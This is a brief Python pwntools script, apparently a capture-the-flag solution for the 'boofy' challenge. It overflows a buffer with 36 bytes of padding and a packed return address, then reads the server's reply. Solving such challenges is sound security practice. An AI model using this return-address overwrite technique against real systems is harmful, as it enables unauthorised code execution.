from pwn import *

# nc boofy.tghack.no 6003

adr = p32(0x08048486)
overflow = b'A'

con = remote('boofy.tghack.no', 6003)
con.recv().decode()
con.sendline(overflow * 36 + adr)
con.recv()
print(con.recv().decode())
